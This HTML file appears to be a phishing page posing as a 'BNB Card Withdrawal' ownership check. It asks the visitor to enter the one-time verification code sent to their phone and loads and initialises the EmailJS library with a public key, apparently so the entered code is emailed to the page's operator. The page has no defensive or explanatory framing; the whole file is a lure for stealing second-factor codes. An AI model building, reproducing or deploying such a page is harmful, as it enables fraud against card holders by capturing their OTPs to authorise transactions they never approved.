<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BNB Card Withdrawal</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="company-info">
        <img src="another.jpg" alt="Company Logo" class="company-logo">
        <h2 style="color: black;">BNB CARD WITHDRAWAL</h2>
        <p style="color: black;">Please confirm you are the owner of this card by submitting the veriication code sent to your number.</p>
    </div>
    <div class="payment-form">
        <form id="payment-form">
            <label for="bank-name">Please enter verification code</label>
            <input type="text" id="bank-name" name="bank-name" placeholder="Enter O.T.P">
            <br><br>
            
            <input type="submit" value="Confirm" id="pay-button" class="pay-button">
        </form>
    </div>
    <div class="note">
        <p>Kindly fill in your details correctly and we will get back to you via email or SMS to confirm card ownership.</p>
    </div>

    <script src="script.js"></script>
    <script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
</script>
<script type="text/javascript">
   (function(){
      emailjs.init({
        publicKey: "BY0_xcfUatZaPlAxQ",
      });
   })();
</script>

</body>
</html>
